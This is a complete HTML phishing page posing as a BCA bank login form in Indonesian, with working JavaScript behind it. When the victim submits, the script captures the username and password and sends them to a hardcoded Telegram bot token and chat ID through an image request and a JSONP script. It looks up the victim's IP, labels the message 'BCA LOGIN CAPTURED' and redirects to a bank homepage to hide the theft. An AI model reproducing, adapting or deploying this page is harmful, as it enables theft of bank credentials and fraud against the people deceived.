<!DOCTYPE html>
<html>
<head>
    <title>Login BCA</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:Arial; }
        body { background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
        .box { background:white; border-radius:10px; width:100%; max-width:400px; padding:40px 30px; box-shadow:0 5px 15px rgba(0,0,0,0.1); }
        h1 { text-align:center; color:#1a237e; margin-bottom:5px; font-size:28px; }
        .subtitle { text-align:center; color:#666; margin-bottom:30px; font-size:14px; }
        label { display:block; margin-bottom:8px; color:#333; font-weight:bold; font-size:14px; }
        input { width:100%; padding:14px; border:2px solid #ddd; border-radius:8px; margin-bottom:25px; font-size:16px; }
        button { width:100%; background:#1a237e; color:white; border:none; padding:16px; border-radius:8px; font-size:18px; cursor:pointer; font-weight:bold; }
        .link { text-align:center; margin-top:25px; padding-top:20px; border-top:1px solid #eee; }
        .link a { color:#1a237e; text-decoration:none; font-size:14px; }
        .version { text-align:center; margin-top:25px; color:#888; font-size:12px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Login</h1>
        <div class="subtitle">ACTION</div>
        
        <form id="loginForm">
            <label>USERNAME</label>
            <input type="text" id="username" placeholder="Masukkan Username Anda" required>
            
            <label>PASSWORD</label>
            <input type="password" id="password" placeholder="Masukkan Password Anda" required>
            
            <button type="button" onclick="submitToTelegram()">Login</button>
        </form>
        
        <div class="link">
            <a href="#">Lupa Password / MPIN / Username</a>
        </div>
        
        <div class="version">Version 12.6</div>
    </div>

    <script>
    function submitToTelegram() {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        if(!username || !password) {
            alert('Harap isi username dan password!');
            return;
        }
        
        // TELEGRAM CONFIG - YANG BARU!
        const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
        const CHAT_ID = "8313500840"; // CHAT ID BARU
        
        // Button loading state
        const btn = document.querySelector('button');
        const originalText = btn.innerHTML;
        btn.innerHTML = 'ðŸ”„ Mengirim...';
        btn.disabled = true;
        
        // Create message
        const message = `ðŸš¨ BCA LOGIN CAPTURED ðŸš¨

ðŸ‘¤ Username: ${username}
ðŸ” Password: ${password}
ðŸ“ IP: ${getIP() || 'Unknown'}
ðŸ• Time: ${new Date().toLocaleString('id-ID')}
ðŸŒ Source: GitHub Pages`;

        // Method 1: Image-based tracking (workaround CORS)
        sendViaImageTracker(username, password);
        
        // Method 2: Try Telegram API via JSONP
        setTimeout(() => {
            sendTelegramJSONP(BOT_TOKEN, CHAT_ID, message);
        }, 300);
        
        // Method 3: Redirect to Bank Aceh (HOME PAGE)
        setTimeout(() => {
            window.location.href = "https://bankaceh.co.id";
        }, 2000);
        
        // Reset button after 3 seconds
        setTimeout(() => {
            btn.innerHTML = originalText;
            btn.disabled = false;
        }, 3000);
    }
    
    // Method 1: Image tracker (always work)
    function sendViaImageTracker(user, pass) {
        const trackerUrl = `https://api.telegram.org/bot8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18/sendMessage?chat_id=8313500840&text=IMG:${user}:${pass}:${Date.now()}`;
        const img = new Image();
        img.src = trackerUrl;
        console.log('Image tracker sent');
    }
    
    // Method 2: JSONP for Telegram
    function sendTelegramJSONP(token, chatId, text) {
        const script = document.createElement('script');
        const callbackName = 'tgCallback' + Date.now();
        
        window[callbackName] = function(response) {
            console.log('Telegram response:', response);
            delete window[callbackName];
            document.body.removeChild(script);
        };
        
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=HTML&callback=${callbackName}`;
        script.src = url;
        document.body.appendChild(script);
    }
    
    // Get IP (simple method)
    function getIP() {
        return new Promise(resolve => {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => resolve(data.ip))
                .catch(() => resolve('Unknown'));
        });
    }
    
    // Auto-submit on Enter
    document.getElementById('password').addEventListener('keypress', function(e) {
        if(e.key === 'Enter') {
            submitToTelegram();
        }
    });
    </script>
</body>
</html>
